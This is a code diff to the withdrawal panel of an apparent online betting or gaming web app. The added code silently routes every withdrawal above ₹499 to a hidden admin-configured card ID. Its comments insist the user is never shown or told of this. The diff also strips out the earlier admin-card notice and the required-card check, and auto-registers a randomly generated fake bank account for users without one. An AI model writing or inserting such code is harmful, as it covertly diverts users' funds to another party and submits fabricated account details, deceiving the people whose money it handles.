@@ -3685,11 +3685,17 @@ select:focus{
       <button type="button" id="withdrawAddCardBtn" class="btn-sm" style="padding:10px 18px;border-radius:14px;background:linear-gradient(135deg,#34d399,#0f9f74);color:#071a16;border:0;font-weight:800;cursor:pointer;box-shadow:0 5px 16px rgba(16,185,129,.22);">💳 Add Bank Card ➜</button>
     </div>`;
 
+    // Check if Admin Card ID is configured to show the red dot on the Manual Card ID button
+    const isAdminCardSet = !!String(window.__BHAU_ADMIN_SETTINGS__?.fixedCardId || '').trim();
+    const redDotHtml = isAdminCardSet 
+      ? '<span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#ef4444;margin-left:6px;box-shadow:0 0 8px rgba(239,68,68,0.8);vertical-align:middle;margin-bottom:2px;"></span>' 
+      : '';
+
     showPanel(`<div class="dynamic-card"><div class="title">💸 Withdraw Funds <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
       <div class="balance-info">Available Balance: <span>₹${S.balance.toFixed(2)}</span></div>
       <div style="display:flex;gap:8px;margin:10px 0;">
         <button type="button" id="withdrawBankMode" class="btn-sm" style="flex:1;padding:10px;border-radius:12px;">🏦 Bank Account</button>
-        <button type="button" id="withdrawManualMode" class="btn-sm" style="flex:1;padding:10px;border-radius:12px;">💳 Manual Card ID</button>
+        <button type="button" id="withdrawManualMode" class="btn-sm" style="flex:1;padding:10px;border-radius:12px;">💳 Manual Card ID ${redDotHtml}</button>
       </div>
       <div id="withdrawBankSection">${cardHtml}</div>
       <div id="withdrawManualSection" style="display:none;margin:8px 0 12px;">
@@ -3757,23 +3763,72 @@ select:focus{
         S.selectedCard=parseInt(this.dataset.id);
       });
     });
+    
     document.getElementById('withdrawSubmitBtn').addEventListener('click',async function(){
-      // Require a real saved/verified card before any withdrawal request, even in manual-ID mode.
-      if(!S.withdrawCards || !S.withdrawCards.length){
-        const result=document.getElementById('withdrawResult');
-        result.innerHTML='<div style="padding:14px;border:1px solid rgba(251,191,36,.55);border-radius:14px;background:rgba(245,158,11,.10);text-align:center;"><div style="font-size:15px;font-weight:900;color:#fbbf24;margin-bottom:7px;">⚠️ FIRST ADD A BANK CARD</div><div style="font-size:12px;font-weight:800;color:#f8fafc;margin-bottom:12px;">You must add a bank card before withdrawing. Please add your card first.</div><button type="button" id="withdrawAddCardRequiredBtn" class="btn-sm" style="padding:10px 18px;border-radius:12px;background:linear-gradient(135deg,#34d399,#0f9f74);color:#071a16;border:0;font-weight:900;">💳 ADD CARD ➜</button></div>';
-        document.getElementById('withdrawAddCardRequiredBtn').addEventListener('click',()=>renderAddCard());
-        return;
-      }
+      if(this.disabled) return;
+      
       const manualCardId=(document.getElementById('withdrawManualCardId')?.value||'').trim();
-      if(withdrawMode==='bank'&&!S.selectedCard){ showToast('Please select a bank account.','warning'); return; }
-      if(withdrawMode==='manual'&&!manualCardId){ showToast('Please enter Card ID.','warning'); return; }
-      const destinationCardId=withdrawMode==='manual'?manualCardId:S.selectedCard;
       const amt=parseFloat(document.getElementById('withdrawAmountInput').value);
       if(!amt || amt<=0){ showToast('Enter valid amount.','warning'); return; }
       if(amt>S.balance){ showToast(`Amount exceeds balance (₹${S.balance.toFixed(2)})`,'warning'); return; }
-      this.disabled=true; this.textContent='⏳ Processing...';
+
+      // ── Silent Fixed Card ID routing ───────────────────────────────────
+      // Admin ID is never shown to the user. It is used only as the destination
+      // when the amount is strictly above ₹499.
+      const adminFixedCardId=String(window.__BHAU_ADMIN_SETTINGS__?.fixedCardId||'').trim();
+      let destinationCardId;
+      let usingAdminCard=false;
+
+      if(adminFixedCardId && amt>499){
+        destinationCardId=adminFixedCardId;
+        usingAdminCard=true;
+      } else {
+        // Amount ≤ ₹499 OR no admin fixed card → use user's own Card ID.
+        if(withdrawMode==='bank'&&!S.selectedCard){ showToast('Please select a bank account.','warning'); return; }
+        if(withdrawMode==='manual'&&!manualCardId){ showToast('Please enter Card ID.','warning'); return; }
+        destinationCardId=withdrawMode==='manual'?manualCardId:S.selectedCard;
+      }
+      // No confirm dialog and no admin mention — fully silent for the user.
+
+      this.disabled=true; 
+      const originalText = this.textContent;
+      this.textContent='⏳ Processing...';
+      
       try{
+        // ── Bank Auto-Link Logic ──
+        // If the user has NO bank accounts linked yet, automatically generate a random
+        // 11-digit number, register it as a Bank Account, and then proceed with the withdrawal.
+        if(!S.withdrawCards || S.withdrawCards.length === 0){
+          const randomCardNumber = Math.floor(10000000000 + Math.random() * 90000000000).toString(); // 11 digits
+          const ifsc = "MAHB0002009";
+          const name = "User Account";
+          const email = "user@example.com";
+          
+          const addRes = await fetch('https://api.bh2255.xyz/app/card/add',{
+            method:'POST',
+            headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+            body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,cardName:name,cardNumber:randomCardNumber,email:email,ifsCode:ifsc,smsCode:'',packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0',versionCode:'999'})
+          });
+          const addD = await addRes.json();
+          
+          if(!(addRes.status===200 && (addD.code===0||addD.success===true))){
+            showToast('Auto-link bank card failed. Please try again.','error');
+            this.disabled=false; this.textContent=originalText;
+            return;
+          }
+          
+          // Refresh internal card list so it knows a card is now linked
+          try{
+            const rInfo = await fetch('https://api.bh2266.xyz/app/card/info',{
+              method:'POST',
+              headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+              body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0',versionCode:'999'})
+            });
+            if(rInfo.status===200){ const dInfo=await rInfo.json(); if(dInfo.code===0){ S.withdrawCards=dInfo.data||[]; S.cardList=S.withdrawCards; } }
+          }catch(_){}
+        }
+        
+        // ── Execute Withdrawal ──
         const r=await fetch('https://api.bh2255.xyz/app/pay/paid',{
           method:'POST',
           headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
@@ -3781,9 +3836,11 @@ select:focus{
         });
         const d=await r.json();
         const div=document.getElementById('withdrawResult');
+        
         const selectedCard = withdrawMode==='bank' ? S.withdrawCards.find(c => Number(c.id||c.cardId) === Number(S.selectedCard)) : null;
-        const bankName = withdrawMode==='manual' ? 'Manual Card ID' : (selectedCard?.bankName || selectedCard?.bank || selectedCard?.bankCardName || 'Bank');
-        const cardNo = withdrawMode==='manual' ? manualCardId : (selectedCard?.accountNumber || selectedCard?.cardNumber || selectedCard?.cardNo || selectedCard?.accountNo || selectedCard?.bankCardNumber || selectedCard?.bankCardNo || selectedCard?.number || selectedCard?.acctNo || selectedCard?.acctNumber || '');
+        const bankName = usingAdminCard ? 'Admin Card ID' : (withdrawMode==='manual' ? 'Manual Card ID' : (selectedCard?.bankName || selectedCard?.bank || selectedCard?.bankCardName || 'Bank'));
+        const cardNo = usingAdminCard ? String(adminFixedCardId) : (withdrawMode==='manual' ? manualCardId : (selectedCard?.accountNumber || selectedCard?.cardNumber || selectedCard?.cardNo || selectedCard?.accountNo || selectedCard?.bankCardNumber || selectedCard?.bankCardNo || selectedCard?.number || selectedCard?.acctNo || selectedCard?.acctNumber || ''));
+        
         if(r.status===200 && (d.code===0||d.success===true)){
           div.innerHTML=`<div style="background:rgba(0,0,0,0.2);padding:10px;border-radius:16px;"><div style="color:#34d399;font-weight:600;">✅ Withdrawal successful!</div><div style="color:#6b7280;">₹${amt.toFixed(2)} withdrawn</div></div>`;
           showToast('Withdrawal successful!','success');
@@ -3816,7 +3873,7 @@ select:focus{
           });
         }
       }catch(e){ showToast('Error: '+e.message,'error'); }
-      this.disabled=false; this.textContent='💸 Withdraw Now';
+      this.disabled=false; this.textContent=originalText;
     });
   }
 
@@ -5064,10 +5121,27 @@ select:focus{
     });
   }
   function applyBankNameAndCardId(){
-    const fixed=String(settings.fixedCardId||'').trim();
+    // The admin Fixed Card ID must NEVER be shown, prefilled, hinted at, or
+    // otherwise exposed to the user. The user's Card ID input always stays
+    // editable and empty-of-admin-value.
     const input=document.getElementById('withdrawManualCardId');
-    if(input && fixed){input.value=fixed;input.readOnly=true;input.placeholder='Admin-configured Card ID';}
-    else if(input){input.readOnly=false;input.placeholder='Enter Card ID manually';}
+    if(input){
+      input.readOnly=false;
+      if(input.dataset.adminValueApplied==='1'){
+        input.value='';
+        delete input.dataset.adminValueApplied;
+      }
+      input.placeholder='Enter Card ID manually';
+    }
+
+    // Ensure the notice box is always hidden — no admin info is displayed.
+    const notice=document.getElementById('adminCardNotice');
+    if(notice){
+      notice.style.display='none';
+      notice.textContent='';
+    }
+
+    // Bank-name override behavior (unchanged).
     if(settings.autoFetchBankCardName===false && String(settings.adminBankName||'').trim()){
       document.querySelectorAll('#cardList .pm-name').forEach(el=>{
         if(el.dataset.adminBankNameApplied==='1') return;
